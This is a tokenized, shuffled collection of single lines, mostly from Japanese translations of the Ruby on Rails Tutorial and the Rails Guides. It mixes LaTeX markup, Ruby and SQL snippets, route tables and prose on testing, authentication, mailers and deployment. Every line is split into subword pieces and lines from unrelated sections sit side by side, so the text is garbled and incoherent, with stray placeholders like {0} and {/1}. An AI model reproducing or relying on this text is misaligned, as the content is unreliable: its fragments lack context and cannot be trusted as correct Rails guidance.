▁ ge ▁as ▁of ▁Rails ~ 5 , ▁and ▁in ▁previous ▁versions ▁of ▁Rails ▁the ▁validations ▁are ▁required ▖ ▁We ' ll ▁plan ▁to ▁leave ▁them ▁in ▁for ▁completeness , ▁but ▁it ' s ▁worth ▁be ar ing ▁in ▁mind ▁that ▁you ▁may ▁see ▁these ▁validations ▁omitted ▁in ▁other ▁people ' s ▁code ▖ )╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 000 3 a 9 ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁relationship _ validations ▁( end )╼╼ ▁\ subsection { フォローしているユーザー } ▁% ▁( fold )╼ ▁\ label { sec : following }╼╼
▁ クラスの 変更 内容 が 単 純 であれば 、` Class # class _ eval ` を使用します 。
▁ 継 承 は 強力な 概念 ですが 、 もし 仮 に 継 承 を使用 せずに \ k ode { palindrome ?} メソッドを \ k ode { String } クラス 自身 に追加する ▁( つまり String クラスを 拡張 する ) ▁という 、 より 自然な 方法 を使用すること が 可能 だと したら 、 わざわざ Word クラスを 作 ら なくても \ k ode { palindrome ?} を リテラル 文字列 に対して 直接 実行 できる よう になるはずです ▟ そんな ことが 可能な のでしょうか ▁( なお 、 現在の コードは その ようになってい ない ため 、 以下のように エラー になります ) 。
▁` deconstantize ` メソッドは 、 フルパス の 定数 を表す 参 照 表現 を与え られる と 、 一番 右 の 部分 ▁( 通常 は 定数名 ) ▁ を 取り 除 きます 。
▁The ▁result ▁is ▁that ▁the ▁\ k ode { full _ title } ▁method ▁is ▁\ href { http :// cat b ▖ org / j argon / html / A / automagically ▖ html } { automagically } ▁available ▁in ▁all ▁our ▁views ▖
▁`: on ` オプション を使用して 、 たとえば 以下のように 別の new アクション を追加 できます 。
▁class ▁ Comments Controller ▁< ▁Application Controller
▁### ▁ デフォルト スコープ を適用する
▁ 失敗する テストが 書 け たので 、 よう や く フ リ ンド リ ー フ ォ ワ ー デ ィ ング を実装する 準備ができました
▁# ▁config ▖ assets ▖ prefix ▁= ▁"/ assets " は 、 アセット の 置き場所 となる パス を変更する 際に 使用する 。
▁デフォルトは 空 文字列 です 。
▁ 後で 統合 時に 悩 まず に す む よう 、 アプリ を なるべく 早い 段階で Heroku に デプロイ して おくとよいでしょう 。
▁最初に 、 リスト { p 0} で 示 している ように Bootstrap を追加しましょう ▟ これは 、 {2} bootstrap - sass {/2} ▁gem を使用して Rails アプリケーションに 導 入 できます 。
▁ ActionView :: Missing Template :
▁\ ref { sec : destroy ing _ users } で 書いた ように 、 サイト 管理者 は ユーザーを \ emph { 破 棄 する } 権限 を持ちます 。
▁ 続けて ログイン を 行った 後 、 転 送 先 の URL は デフォルト ▁( プロフィール画面 ) ▁ に 戻 る 必要もあります ので 、 これも テストで 確認してください 。
▁ 後で 使う ために 記憶トークン を cookies に保存 する方法 の 説明 が 終わり ました ので 、 今度は 移動 先 の ページ で ユーザーを 取り出す 方法 について 学 び ましょう 。
▁| ▁--------- ▁| ▁ ---------------- ▁| ▁- ---------------- ▁| ▁------------ ---------------- ---------------- ▁|
▁TIP : ▁ アプリケーションで RESTful ルーティング が 多数 使用されている のであれば 、 それら に 適 宜 `: only ` や `: except ` を使用して 、 本当に 必要な ルーティング のみ を生成する ことで 、 メモリ 使用 量 の 節 約 と ルーティング プロセス の 速 度 向上 が 見 込 め ます 。
▁self を省略した 結果を リスト \ ref { code : log _ out _ method } に示します 。
▁ メールを 配信 する 前に 何らかの 編集 を加え たい ことがあります 。
▁ バ ナ ー 広 告 は 、 比 較 的 目 新しい 攻 撃 点 です 。
▁リスト \ ref { code : default _ controller _ test } を参考に すれば 、 正しい テストコード を 何 と なく 想 像 できる と思います ▟ 正しい テスト コードをリスト \ ref { code : about _ test } に示します 。
▁\ k ode { count } 関連付け メソッドは 賢 く でき て いて 、 直接 データベース で カウント を行います 。
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' active '
▁< option ▁value = "1" ▁select ed =" select ed "> David </ option >
▁# ▁ 指定された 分 を デフォルト値 として 持つ セレクト ボックス を生成する
▁( {0} self {/0} は 、 通常の 文 脈 では User 「 モデル 」 、 つまり ユーザー オブジェクトの {1} インスタンス {/1} を指します が 、 リスト \ ref { code : token _ digest _ class _ self } や リスト { p 4 } の 文 脈 では 、 {0} self {/0} は {0} User {/0} 「 クラス 」 を指す ことにご注意ください 。
▁これらの 置き場所 の詳細については 、[ アセットパイプライン ガイド の 「 アセット の 編 成 」 ]( asset _ pipeline ▖ html # アセット の 編 成 ) ▁ を参照してください 。
▁self を省略した 結果を リスト \ ref { code : persistent _ sessions _ test } に示します 。
▁なお 、 次の リスト には 、 変更 を加え た 節 または コード へのリンク が 追加 して あります 。
▁self を省略した 結果を リスト \ ref { code : comment _ out _ failing _ tests } に示します 。
▁### ▁ イニシャライザ
▁╼╼ ▁\ subsection { Users コントローラ } ▁% ▁( fold )╼ ▁\ label { sec : users _ controller }╼╼
▁ユーザー と 能動的関係 の関連付け によって 使える ようになった メソッドの まとめ
▁ SELECT ▁clients ▖
▁### ▁ ト ラン ザ ク ション コールバック の エラー 処理
▁# ▁ その後 データベースから 再度 読み込まれる
▁ 必要であれば 、 コレクション や コレクション の各 メンバー に対して 適用 される リソース を追加する こともできます 。
▁ Regexp ▖ new (' ▖ ', ▁ Regexp :: M U L T I L IN E )▖ multiline ?
▁図 \ ref { fig : micropost _ model } の モデル では 、 マイクロポストの 投 稿 に \ k ode { String } 型 ではなく \ k ode { text } 型 を 使 っ ている点に注目してください ▟ これは 、 ある程度 の 量 の テキスト を 格 納 するときに 使われ る 型 です 。
▁# ▁Rails ▁4▖1 の場合
▁その 途中 で 、 Rails の 開発環境 や 本番環境 から メールを送信 する方法 についても 学習 します 。
▁select _ date ( Time ▖ today ▁+ ▁6 ▖ day s )
▁ テスティング 用に ed ge ▁Rails を 入 手 する方法 については 後 述 します 。
▁ 具体的には 、 ユーザー登録 を セキュア に するために 、 本番 用の アプリケーションに 重要な 機能を 追加 していきます ▟ その後 、 デフォルトの Web サーバ を 実際の 世界 で 使われ ている Web サーバ に置き換え ていきます 。
▁今回の場合 、 そう した 変数 は SendGrid ア ド オン が自動的に 設定 してくれます が 、\ ref { sec : image _ upload _ in _ production } では 環境変数 を 自分で 設定 し なければなりません 。
▁ テストで \ k ode { is \_ logged \_ in ?} ヘルパーメソッド を 利用 できるように して あった おかげで 、 有効な 情報を セッション 用 パス に post した 直後 に \ k ode { assert ▁is \_ logged \_ in ?} で 簡単に テストで きました 。
▁ オブジェクト に 渡される メッセージ は 、 一般に は \ emph { メソッド } と呼ばれ ます ▟ メソッドの 実 体 は 、 そのオブジェクト に 定義された 関数 です
▁ 生成された ばかり の User モデル
▁そこで 、 サインアウト の 機能 を実装する 前に その 部分を もう少し 作り 込 みましょう 。
▁ デプロイ された アプリケーションの 表示 は 、\ k ode { heroku ▁create } ▁( {1} リスト 1 ▖ 15 {/1} ) ▁ を実行し た 際に 生成された アドレス を ブラウザで 開 く だけです ▁( もちろん ここ に表示されている 著者 の アドレス ではなく 、 {2} {/2} あなた の アドレス を使って ください ) 。
▁{0} 図 10 ▖4{/0}{1} マイクロポスト が表示され た プロファイル ページのモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / user _ microposts _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁このとき 、 リスト \ ref { code : successful _ edit _ test } の パスワード と パスワード 確 認 が 空 である ことに注目してください ▟ ユーザー名 や メールアドレス を編集する ときに 毎 回 パスワード を入力する のは 不 便 なので 、( パスワード を変更 する必要が 無 い ときは ) ▁ パスワードを 入力 せずに 更新 できる と 便利です 。
▁ }╼╼ ╼ ▁% ▁subsection ▁database _ migrations ▁( end )╼╼ ▁\ subsection { model ファイル } ▁% ▁( fold )╼ ▁\ label { sec : the _ model _ file }╼╼
▁self を省略した 結果を リスト \ ref { code : follow _ unfollow _ following } に示します 。
▁Rails アプリケーションの セキュリティ の詳細については 、 本ガイド の [ Rails セキュリティ ガイド ]( security ▖ html ) を参照してください 。
▁[1, ▁2, ▁3] ▖ in _ groups _ of ( 2, ▁0 ) ▁# ▁=> ▁[[1, ▁2 ] , ▁[ 3 , ▁0 ]]
▁Client ▖ order ( created _ at : ▁: desc )
▁ 通常 、 これは 初期 値が \ k ode { nil } である 変数 への 代入 を 意味 します が 、\ k ode { false } 値 も \ k ode { ||= } 演算子 によって 上書き される ことに注意してください 。
▁resources ▁: images , ▁only : ▁: index
▁これらの 階層 にある クラス の詳細 を知る 必要はない と思います 。
▁ く く り だ した メソッドは 、 マスアサインメント を 避ける だけで なく 、 外部 から 不 正 に 呼び出され ることのないように ` private ` 宣言 の 後 に置い てください 。
▁ 生成 し 終わったら 、 Rails サーバー を 一度 落 として 、 起動 し 直 してください 。
▁if ▁@ book ▖ nil ?
▁Git で バージョン管理 を 行 っている のであれば 、 以下のコマンドを実行し て 、 静的なページ 用の トピックブランチ を チェック ア ウ ト しましょう 。
▁デフォルトでは 、 レコード は 主キー の 昇 順に 取り 出 されます ▟ 主キー は 整 数 で なければなりません 。
▁( もし この とおり にならない 場合は 、 ブラウザの JavaScript が有効になってい る かどうかを確認 してください ▟ Rails では 、 ユーザーを削除する リクエストを 発行する ときに JavaScript を使用しています ) 。
▁たとえば 、 Rails アプリケーションに 顧客 ( customer ) と 注文 ( order ) 情報 が含まれ ており 、1 つの 注文 に つ き 正確に 1 人 の 顧客 だけ を 割り当て たい のであれば 、 Order モデル で 以下のように 宣言 します 。
▁{0} ▖ erb {/0} の詳細については { p 1 } で説明します が 、 ファイル名 に {0} ▖ html {/0} が含まれている こと から わ か る 、 基本的に は HTML と同じ ような 構造 になっています ▁( {3} \ k ode { リスト 3 ▖ 7 } {/3} ) 。
▁ このコード を追加した ことにより 、 ユーザー編集ページ が 動く ようになります ▁( 図 \ ref { fig : edit _ form _ working })▟ すべての テストを 走 ら せ て み て ▁\ passing \ ▁ した かどうか 確かめ てみてください 。
▁ 空 き を 埋 め る 値は 2 番目の オプション 引数 で 指定 できます 。
▁それでは 、 コンソール で 文字列 について 調 べ てみましょう 。
▁ テスト駆動開発 は 、 テストで バグ を再 現 してから デバッグ したい場合 に 便利です 。
▁ユーザー登録 失敗 時に エラーメッセージ が表示される ように する
▁ まず 、\ emph { Gemfile } に \ k ode { Faker } ▁gem を追加します ▁( リスト \ ref { code : fa k er _ gemfile })▟ これは 、 実際に あり そう な ユーザー名 と メールアドレス を持つ サンプルユーザー を自動的に 作成する ものです 。
▁render ▁" edit "
▁ 有効な メール フォーマット をテストする
▁ bcrypt を使って 生成 されているので 、 この 文字列 から 元 々 の パスワードを 導 出 することは 、 コンピュータ を使って も 非 現 実 的 です
▁ 有効な ユーザー登録 に対するテスト
▁この リスト では 、 Rails ▁3▖2 向 け の 第 2 版 を 既に 読み 終 わ った 方 のために 、 変更 された 箇所 だけ を まとめ ました 。
▁なお 、 新しく 作る リンク は 4 つ ですが 、 そ のうち 以下の 2 つの リンク は 当 面 の 間 未 実装 のまま とします ▁({0}{1} 第 9 章 {/1}{/0} で 完成 の 予 定 ) 。
▁### ▁ バリデーション を行なう 理由
▁index ビュー ▁( ` app / views / users / index ▖ html ▖ erb ` ) ▁ の内容 は以下のようになります 。
▁ 有効な User かどうか をテストする ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁Date ▖ new (201 0, ▁4 , ▁30 )▖ months _ ago (2) ▁# ▁=> ▁Sun , ▁28 ▁Feb ▁2010
▁Active ▁Support は 、` load ` に 一 定 の 自動 読み込み サポート を追加します 。
▁=> ▁" Example ▁User "
▁なお 、 これは 上の sanitize () フィルタ で 認 識 されます 。
▁def ▁perform ( trashable , ▁ de p th )
▁<%= ▁render ▁" menu " ▁%>
▁ いよいよ 、 コメント フォーム が動作する の に必要な 最後の 手順を 行い ましょう 。
▁" Invoice L in e "▖ tableize ▁# ▁=> ▁" invoice _ lines "
▁title タグ は 、 ほとんどの ブラウザで ウィンドウ の 上に 表示されます ▁( Google ▁C h r o me は 例外 ですが )▟ title タグ は 、 検索 エンジン 最適化 ▁( SE O ) ▁ において も 重要な 役 割 を 担 っています 。
▁ どう や ら フォームの 送信 先 は 別の URL に し なければならない よう です 。
▁* ▁ インライン 添付 を使用すること を Mail に 指示 するには 、 Mailer 内の attachments メソッド に対して ` # inline ` を呼び出す だけで済みます 。
▁このとき の 、 コントローラ から ビュー への 結果 の 渡 し 方 こ そ が 本ガイド の 主な トピック です 。
▁ 実際 、 この手法は 実に 便利な ので 、 Active ▁Record は 以下 でも デフォルトで 同じ 結果 を返します 。
▁\ k ode { about } 用の ルート を追加する
▁従って 、1 ページ 目 は 1 から 30 のユーザー 、2 ページ 目 は 3 1 から 60 のユーザー といった 具 合 に データ が 取り 出 されます ▟ ちなみに \ k ode { page } が \ k ode { nil } の場合 、 ▁\ k ode { paginate } は 単 に 最初の ページ を返します 。
▁ そんな 私 ですが 、 Michael ▁Hartl ▁ 氏 の 本 を 強く 勧 め られた ので 、 その 本 を使って もう一度 試 してみ た 結果 、 今度は 無 事 に ▁Rails ▁ に 乗 り 換 え る ことができ ました ▟ それが この ▁\ emph { Ruby ▁on ▁Rails ▁ チュートリアル } という 本 です 。
▁ ユーザーを フォロー した 後 、 本当に その ページ から 離 れ て 元の ページに 戻 らない と いけない のでしょうか ▟ この 点を 考え なお してみましょう 。
▁以下の マイグレーション を コマンドラインで 実行 して 図 \ ref { fig : user _ model _ account _ activation } の データモデル を追加する と 、 3 つの 属性 が 新しく 追加 されます 。
▁ この節 を理解する には 、 多少 なり とも オブジェクト 指 向 プログラミング ▁( O O P ) ▁ の 経験 が必要です ▟ オブジェクト 指 向 プログラミング を 学 んだ こと の ない 方は この節 を スキップ しても構いません 。
▁| ▁DELETE ▁| ▁ / sekret / comments / : id (▖ : format ) ▁| ▁comments # destroy ▁| ▁comment _ path ▁|
▁ コマンドライン の 基本的な 仕 組み は 本当に シ ン プ ル です ▟ ユーザーは コマンドを 発 行 ▁( issue ) ▁ することで 、 実に さまざまな 操作を 実行 できます ▟ ディレクトリ の作成 なら \ text tt { mkdir } コマンド 、 ファイルの 移動 や リ ネ ーム は \ text tt { mv } コマンド 、 ファイルの コピー なら \ text tt { c p } コマンド 、 ファイルシステム 内で の ディレクトリ の 移動 は \ text tt { cd } コマンド 、 という 具 合 です 。
▁database : ▁ NOT _ my _ database
▁ その中で も 特に お勧め の Rails の 情報 源 を 紹介します 。
▁belongs _ to ▁: author , ▁class _ name : ▁" User "
▁まずは 、 順序 無 し リスト の ▁\ emph { ul } タグ ではなく 、\ k ode { 順序 付き } リスト の \ emph { ol } タグ を 使 っ ている点に注目してください ▟ これは 、 マイクロポスト が 特定の 順序 ▁( 新しい → 古 い ) ▁ に依存し ている ためです 。
▁しかし 、 このように せ ざ る を 得 ない場合は 、` where ` を 通常 どおり に使用する ことができます 。
▁render ▁ json : ▁@ product
▁Rails アプリケーション 自身 は これらの デ コ レ ー タ を参照 することは ないので 、 Rails の 自動 読み込み 機能 では これらの デ コ レ ー タ を 読み 込 んだ り 起動 したり できません 。
▁ レイアウト と レンダリング
▁### ▁ バリデーション の スキップ
▁belongs _ to ▁: order , ▁-> ▁ { ▁includes ▁: customer ▁ }
▁リスト \ ref { code : sendgrid _ config _ redux } に示した とおり 、 本番 Web サイトの アドレス を \ k ode { host } 変数 に 定義 する 必要もあります 。
▁* ▁ ク ッ キー 機能 を提供します 。
▁╼╼ ▁% ▁sub subsection ▁refactor ▁( end )╼╼ ▁% ▁subsection ▁our _ first _ test ╼╼ ▁% ▁section ▁getting _ started _ with _ testing ▁( end )╼╼ ╼ ▁\ section { 少しだけ 動的な ページ } ▁% ▁( fold )╼ ▁\ label { sec : slightly _ dynamic _ pages }╼╼
▁この ` blorgh ` エンジン であれば 、 記事 と コメント の 作 者 の 情報 がある 方が ずっと わかりやすく なります 。
▁\ ref { sec : reset ting _ the _ password } でも 説明したとおり 、 「\ k ode { < }」 を 「 〜 より 少 ない 」 ではなく 「 〜 より 早い 時刻 」 と 解 釈 すれば 、「 パスワードの再設定 は 、 現在 より 2 時間 以上 前の 時刻 に 行われた 」 という 言 明 と 一致し ます 。
▁assemblies ▖ size
▁\ k ode {@ } ▁ 記 号 によって 示 されている とおり 、\ k ode {@ name } と \ k ode {@ email } は 両方 とも インスタンス変数 なので 、 自動的に \ k ode { formatted \_ email } メソッドで 使える ようになります 。
▁ユーザー ご と の マイクロポストを RSS フィード する 機能を実装し てください 。
▁### ▁Action ▁Mailer
▁Action ▁View は 、 現在の ロケール に応じて さまざまな テンプレート を出力する ことができます 。
▁リスト \ ref { code : unsuccessful _ edit _ test } の テストでは 、 まず 編集 ページ にアクセス し 、 edit ビュー が 描画 される かどうかを チェック しています ▟ その後 、 無効な 情報を 送信 してみ て 、 edit ビュー が 再 描画 される かどうかをチェックします 。
▁ パスワード 再設定 用の \ k ode { create } アクション
▁リスト \ ref { code : password _ reset _ integration _ test } のコード を使用すると 、 テストコード は ▁\ passing ▁ になるはずです 。
▁ クラウド IDE は 普通 の Web ブラウザ の中で 実行 できる ため 、 プラットフォーム が 異 な って も 同じ ように 扱 えます ▟ この 特 長 は 、( Windows のような ) ▁Rails 開発環境 の 構 築 が 面倒な OS では 特に 便利です 。
▁ hello ") ▁# ▁=> ▁true
▁最後に 、 ユーザーを ` show ` アクションに リダイレクト します ▁( ` show ` アクションは この後 定義 します )▟ 訳 注 : ▁ モデル を保持し ている @ article を指定する だけで 、 その モデル を表示する ための ` show ` アクション にリダイレクトされる 点にご注目ください 。
▁ grade _ deployment ▁( end )╼╼ ▁\ section { 最後に } ▁% ▁( fold )╼ ▁\ label { sec : sign _ up _ co nclusion }╼╼ B e ing ▁able ▁to ▁sign ▁up ▁users ▁is ▁a ▁major ▁mil est one ▁for ▁our ▁application ▖
▁create ▁db / migrate / 2013 0 3 07 00 55 28 _ create _ microposts ▖ rb
▁` redirect _ to ` を呼び出す と 、 一時 的な リダイレクト を 意味 する HTTP ステータスコード 302 が ブラウザに 返 され 、 ブラウザは それ に基いて リダイレクト を行います 。
▁ 述 語 ` in ?` は 、 ある オブジェクトが 他の オブジェクト に含まれている かどうか をテストします 。
▁このオプション は 、` sass - rails ` を使用すると デフォルトで 設定 されます 。
▁\ text tt { ||= } という 記 法 は非常に Ruby 的 であり 、 Ruby という 言語 を 強く 特 徴 づ け る ものです ▟ Ruby プログラミング の 達 人 になり たい のであれば 、 この 記 法 を 習 得 すること が重要です 。
▁TIP : ▁ シンボル は `: " ActiveRecord :: Base " ` で 行 な っている の と同じように フルパス の 定数 として 表 す ことができます ▟ シンボル が その ように 動作する のは それが 便 利 だ から であり 、 技術 的に そう し なければならない という もの ではありません 。
▁C ▖ descendants ▁# ▁=> ▁[ B , ▁A , ▁D ]
▁``` y a m l
▁\ k ode { : followers } 属性 の場合 、 Rails が ▁“ followers ” ▁ を 単数形 に して 自動的に 外部キー \ k ode { follower _ id } を探し てくれる からです ▁( : followed では こう は い き ません ) 。
▁ 先ほど の 順 で 書いた 統合テスト は 、 リスト \ ref { code : micropost _ interface _ test } のようになります 。
▁` find _ by _ sql ` は ` connect ion # select _ all ` と 深 い 関係 があります ▟ ` select _ all ` は ` find _ by _ sql ` と同様 、 カスタム SQL を使用して データベースから オブジェクト を取り出し ますが 、 取り出し た オブジェクト のインスタンス 化 を行わ ない 点 が異なります 。
▁C :: X ", ▁false ) ▁# ▁=> ▁false
▁Relationship s コントローラの 認可 をテストする 。
▁| ▁app / assets / javascripts / comment ▖ js ▖ coffee ▁| ▁ コントローラ 用の CoffeeScript ▁|
▁are ▁all ▁the ▁same ▖ ▁\ emph { Hint } : ▁It ' s ▁ probably ▁easie st ▁to ▁compare ▁directly ▁using ▁\ k ode {==} ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - e 4 e f 4 b ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁a _ proto _ feed ▁( end )╼╼ ▁\ subsection { マイクロポスト を削除する } ▁% ▁( fold )╼ ▁\ label { sec : destroy ing _ microposts }╼╼
▁ データモデル の 変更 が必要 に なったら その 都 度 マイグレーション を行う のが Rails 流 です 。
▁Ruby ▁on ▁Rails ▁ に 貢献 する方法
▁content : ▁ en code d _ content
▁ テストが 揃 っ ていれば 、 機能 停 止 に 陥 る ような \ emph { 回 帰 バグ } ▁( re gr ess ion : ▁ 以前の バグ が 再 発 したり 機能 追加 / 変更 の 副 作 用 が生じ たり すること 、 先 祖 返 り とも 言 う ) ▁ を 防止 できる 。
▁\ ref { sec : signing _ in } では 、 Rails の \ k ode { session } メソッドを使用して ユーザー ID を 保存 しました が 、 この 情報 は ブラウザを閉じ ると 消え てしまいます 。
▁orders ▖ exists ? (▖▖▖)
▁このヘルパーは 、 オブジェクトが保存される 直前に 、 属性の値 が 一意 であり 重複 していない こと を検証します 。
▁* ▁[ ファイル名 の 変更 に クエリ 文字列 を使用して は いけない 理由 ]( http :// www ▖ s te ve so u d ers ▖ com / blog / 2008 / 08 / 23 / re v v ing - filename s - do nt - use - query string / )
▁次に 、 拡張子 を ▁\ k ode { ▖ md } ▁ に変更し 、 Markdown ファイル として 認 識 できるようにします ▟ その後 、 これらの 変更を コミット します 。
▁ や る 気 の 余 っている 方は 実装 してみ ても よいでしょう 。
▁Your ▁bundle ▁is ▁complete !
▁従って 、 Home ページの テストはパスするはずです 。
▁リスト \ ref { code : rails _ command } の コマンドで は 、 Rails のバージョン を ( \ k ode { _ 4▖2▖0 _ }) と 明示的に 指定 している 点にご注目ください 。
▁ 構造 を追加した Web サイトの レイアウト
▁* ▁Rails アプリケーションで メールを 送 受 信 する方法
▁もちろん あります ▟ それ も い ろ ん な 方法があります 。
▁ 以上の 点を 考 慮 して 、 有効な トークン と それ に関連する ダイジェスト を作成 できるようにします ▟ 具体的には 、 最初に \ k ode { User ▖ new _ token } で 記憶トークン を作成し 、 続いて \ k ode { User ▖ digest } を 適用 した結果 で 記憶ダイジェスト を更新し ます ▟\ k ode { remember } メソッドの 更新 結果を リスト \ ref { code : user _ model _ remember } に示します 。
▁上の 説明 で 気付いた方もいると思います が 、2 番目の \ k ode { return } は 実は なくても か ま いません ▟ 関数 中 の最後 に置かれ た 式 ▁( この場合は ▁\ k ode {" The ▁string ▁is ▁nonempty ▖ " }) ▁ は 、\ k ode { return } キーワード が なくても 暗 黙 で 値 を返す ためです ▟ ここでは 、 両方 に \ k ode { return } を使用する 方が 見た 目 の 対 称 性 が 保 た れる ので 好 ま しい と 言えます 。
▁たとえば 、 Action ▁Mailer の場合は 以下を実行し ます 。
▁ 提供され た 接続 情報 が 重複 している場合 、 環境変数 が 優 先 されます 。
▁resources ▁: user _ permission s , ▁controller : ▁' admin / user _ permission s '
▁I 18 n ▖ with _ options ▁ locale : ▁user ▖ locale , ▁scope : ▁" new s let ter " ▁do ▁| i 18 n |
▁\ begin { equ ation }╼\ label { eq : time _ de lt a }╼\ D el t a ▁t _ r ▁> ▁\ D el t a ▁t _ e ▖
▁ 前 章 の 終わり では 、 Rails の レイアウト を使用して ビューで の 重複 を 取り除く ために 、 ほぼ 静的なページ を 単 に 更新 した に と ど まり ました ▁({0}{1} リスト 4 ▖ 1 {/1}{/0} )▟ これは 、 {2}{1} リスト 3 ▖ 32 {/1}{/2} と同じ ものです 。
▁# ▁ 名前付き スコープ を 経 由
▁上のコードは \ k ode { div } タグ があるかどうかをチェック します 。
▁errors [: base ] ▁<< ▁" この 人 物 は 以下の 理由 で 無効 です ▖▖▖"
▁#### ▁option _ groups _ from _ collection _ for _ select
▁たとえば 以下の 呼び出し を行なう と 、 アプリケーションで 現在 どの ページ が表示され て いて も 、 写 真 の インデックス 表示 ページに リダイレクト されます 。
▁cookies ▖ encrypted [: expiration _ date ] ▁# ▁=> ▁" 20 14 - 0 3- 20 "
▁ユーザーの \ k ode { index } アクション
▁ここでは 、 Rails の 組み込み 関数 \ k ode { stylesheet \_ link \_ tag } ▁( 詳細は \ href { http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / AssetTagHelper ▖ html # method - i - stylesheet _ link _ tag } { Rails ▁API } を参照 ) ▁ を使用して 、\ k ode { application ▖ css } を すべての \ href { http :// www ▖ w 3 ▖ org / T R / CSS 2 / media ▖ html } { メディアタイプ } に インクルード しています ▁( メディアタイプ には 、 コンピュータ の 画面 や 印 刷 画面 など も含まれます ) 。
▁ 通常の Rails アプリケーションの 場合 、 外部 からの gem ファイルを ここに 置きます 。
▁Users リソース を生成し て 内容 を 理解 しました ので 、 今度は Microposts リソース で 同じ ことを や って みましょう 。
▁ バグ を見つけ たら 、 その バグ を再 現 する テストを 真 っ 先に 書き 、 回 帰 バグ を防ぐ 体 制 を 整 え て から アプリケーションの コードの 修正 に 取り か か る 。
▁ //= ▁require ▁ s li d er
▁ ついに 、 サンプルアプリケーションの 山頂 が 目 の 前に 現 れ ました ▟ 最後の 難 関 、 ステータスフィード の実装 に取りかかりま しょう 。
▁Rails チュートリアル で使用されている もの すべて を含め 、 ほとんどの マイグレーション が \ emph { 可 逆 } です ▟ これは 、\ k ode { db : rollback } という Rake タスク で 変更を 取り 消 せる ことを意味します ▟ これを “ マイグレーション の 取り 消 し ▁( migrate ▁down ) ▁ と呼びます 。
▁` development ` セクション の ユーザー名 と パスワード は 適切な もの に置き換え てください 。
▁ 時 ▁( hour ) ▁ が ゼロ の場合 、 分 と 秒 も 値を 与 えられ ない限り 同様に ゼロ になります 。
▁ これはリスト \ ref { code : initial _ signup _ test } で使用されていました 。
▁* ▁C api str a no の デプロイ メ ン ト タスク で アセット の プリコンパイル を行わ ないこと 。
▁ 本書 向 け に 、 以下を実行して \ k ode { railstutorial _ rails _4_0 } という名前の gem set を作成し ておく ことをお勧めします 。
▁Article ▖ where (' id ▁> ▁10 ')▖ limit ( 20 )▖ order (' id ▁ desc ')▖ only (: order , ▁: where )
▁# ▁Table ▁name : ▁users
▁上のコード によって 生成される HTML は以下のようになります
▁ サインイン に 失敗した 時の テストが できたので 、 次は サインイン に成功した場合 のテスト を作成し ましょう 。
▁* ▁`: type ` は MIME タイプ を明示的に指定 したい場合 に 使用します 。
▁" B ackoffice :: Session "▖ underscore ▁# ▁=> ▁" b ackoffice / session "
▁production 環境で 何らかの データベース を使用する場合 、 そのため の アダプタ は た いて い の場合 探 せ ば 見 つ か ります 。
▁### ▁ 接続 設定
▁`: object ` オプションを使用することで 、 この ローカル変数 に オブジェクト を渡すことができます 。
▁require ▁' active _ support '
▁render ▁layout : ▁" ol d "
▁ 最初は \ k ode { image } という 属性 名 を使って いた のですが 、 この 名前 だと 一般的 す ぎ て 、 逆に 混 乱 を 招 い てしまい ました 。
▁ SendGrid を使用すると production 環境 から メールを送信 できる 。
▁before _ enqueue ▁do ▁| job |
▁ 代わりに 、 フォロワー と フォローしているユーザー の関係 が 対 称 的 であること を 利用 し 、 単 に \ k ode { followed _ id } を 主キー として 渡す ことで \ k ode { reverse _ relationships } を シ ミ ュ レ ート すればよいのです 。
▁### ▁`: if ` や `: unless ` で Proc を使用する
▁続いて 、 この リモート ブランチ を使用して ローカル のコード ベース を更新し ます 。
▁ 正しい メールアドレスを 送信 した 場合にも アプリケーションが 正常に 動作 するためには 、 パスワード再設定の メイラー メソッド を定義する 必要があります 。
▁X :: Y :: Z ▖ parent s ▁# ▁=> ▁[ X :: Y , ▁X , ▁Object ]
▁また 、 入力 された パスワード を使用して ユーザーを \ emph { 認 証 } する手段 と 、 第 \ ref { cha : log _ in _ log _ out } 章 で使用する 、 ユーザーが サイトに ログイン できるように する手段 も 提供し ます 。
▁# ▁has _ secure _ password
▁ 最後の 課題 は マイクロポストの 投 稿 数 を表示する ことです が 、 これは \ k ode { count } メソッド を使う ことで 解決 できます 。
▁self を省略した 結果を リスト \ ref { code : user _ relationships _ method _ test } に示します 。
▁ 後 は いつものように マイグレーション を実行します 。
▁{0} 図 11 ▖7{/0}{1} ユーザーの リレーションシップ で 表 される 、 フォローしている / されている ユーザーの モデル ▟ {/1}
▁ カスタム CSS 用の ファイルを作成し たら 、 リスト { p 0} のように {2} @ import {/2} を使用して 、 Bootstrap ▁( と それ に関連する Sprockets ) ▁ を インクルード します
▁#### ▁ V a nil la ▁JavaScript を出力する
▁ 「 良い アイディア が 浮 か んだ から 、\ emph { ただ ▁Rails ▁ で ▁Web ▁ アプリ を 作り たい だけ } な の に 、 奇 妙 で 古 く さ い ▁Unix ▁ の エディタ の使い方 を 覚え る だけで 1 週 間 も か か って る !」 と イ ラ イ ラ する 事 も ある でしょう 。
▁Rack に関する 基本的な 知識 が 足 らない 場合 、 下 記 の [ リソース ](# 参 考 資 料 ) ▁ を参照してください 。
▁#### ▁ 遠 い 将来 に 期限切れ になる ヘッダー
▁ 論理値 ? ▁?
▁ tomorrow
▁# ▁ attr i b s : ▁id , ▁name
▁date ▖ beginning _ of _ day ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁00:00:00 ▁+0200 ▁2010
▁{0} 図 2 ▖5{/0}{1} 新規ユーザー 作成 ページ ▁(\ href { http :// localhost :3000/ users / new }{/ users / new })▟ \ href { http :// railstutorial ▖ org / images / figures / demo _ new _ user _ rails _ 3- full ▖ png }{( 拡大 ) }{/1}
▁つまり 、 ユーザーは プロファイル ページを 最初に 表示 し 、 それ から ユーザーを フォロー し 、 その後 すぐ 元の ページ にリダイレクトされる という 流れ になります 。
▁ 情報 が更新され た ユーザー
▁たとえば 、 アプリケーションが ` Blorgh :: Article sController ` の index アクション の結果 を出力する ための ビューを 探 索 する 際に は 、 最初に アプリケーション 自身 の ` app / views / blorgh / articles / index ▖ html ▖ erb ` を 探 索 します 。
